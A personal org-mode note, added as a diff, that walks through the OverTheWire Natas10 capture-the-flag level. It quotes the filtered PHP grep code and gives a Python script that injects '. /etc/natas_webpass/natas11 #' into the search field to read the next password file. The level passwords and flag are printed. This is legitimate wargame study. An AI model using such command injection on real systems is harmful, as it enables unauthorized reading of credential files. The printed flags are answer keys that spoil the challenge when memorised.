@@ -1,0 +1,93 @@
+:PROPERTIES:
+:ID:       cbf374b4-6fb3-4971-83c0-cda46f57beab
+:END:
+#+title: Natas10
+* Previous
+[[id:91399b5f-500e-4e34-b6f1-f37f8148be9f][Natas9]]
+
+* Password
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+* Flag
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+* Notes
+
+Same as before, but with some filtering:
+#+begin_quote
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+#+end_quote
+
+From the source code:
+#+begin_quote
+<?
+$key = "";
+
+if(array_key_exists("needle",$_REQUEST)){
+    $key=$_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&amp;]/', $key)) {
+        print "Input contains an illegal character!";
+    } 
+    else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+#+end_quote
+
+So `;`, `;` and `&` char are not alowed, but this does not prevent our previous attack as we are only using "#" to comment out the rest of the command.
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+import html
+from bs4 import BeautifulSoup as bs
+from natas_pass import passwords
+
+session = requests.Session()
+username = "natas10"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+# response = session.get(url, auth=(username, password))
+# content = response.text
+# print(content)
+
+# response = session.get(url + "index-source.html", auth=(username, password))
+# raw_content = response.text
+# sourcecode = html.unescape(raw_content)
+# soup = bs(sourcecode)
+# print(soup.prettify())
+
+response = session.post(
+    url,
+    auth=(username, password),
+    data={"needle":". /etc/natas_webpass/natas11 #"}
+)
+raw_content = response.text
+sourcecode = html.unescape(raw_content)
+soup = bs(sourcecode)
+# print(soup.prettify())
+
+p = re.findall("([a-zA-Z0-9]{32})", raw_content)
+
+if p and p[0] == password:
+    p.pop(0)
+
+print(p[0])
+#+end_src
+
+#+RESULTS:
+: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+* Next
+[[id:fa870da3-03df-4ed4-8282-bf34abc24f11][Natas11]]
